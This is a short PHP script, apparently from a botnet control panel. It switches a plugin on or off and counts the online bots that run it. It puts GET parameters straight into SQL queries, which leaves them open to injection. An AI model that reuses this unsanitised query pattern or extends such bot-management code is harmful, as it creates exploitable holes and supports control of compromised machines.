<?
	include_once "../common.php";
	if( !$user->Check() ) exit;

	$plugin = $_GET['plugin']; $act = $_GET['act'];

	$sql = "UPDATE plugins SET status = $act WHERE plugin = '$plugin'";
	$db->query($sql);

	$sql = "SELECT COUNT(*) FROM plugins WHERE plugin = '$plugin'";
	$res2 = $db->query($sql);
	list($cnt) = $res2->fetch_array();
			
	$sql = "SELECT COUNT(*) FROM bots_t, plugins WHERE status_bot = 'online' AND plugins.plugin = '$plugin' AND bots_t.id_bot = plugins.fk_bot";
	$res2 = $db->query($sql);
	list($cntonline) = $res2->fetch_array();
			
	$sql = "SELECT COUNT(*) FROM bots_t, plugins WHERE status = 1 AND status_bot = 'online' AND plugins.plugin = '$plugin' 
			AND bots_t.id_bot = plugins.fk_bot";
	$res2 = $db->query($sql);
	list($cntactonline) = $res2->fetch_array();

	echo "<font style='color: rgb(65, 183, 81); font-size: 11px;'><b>$cntactonline</b></font> <i>/</i> <b>$cntonline</b> <i>/</i> $cnt";
?>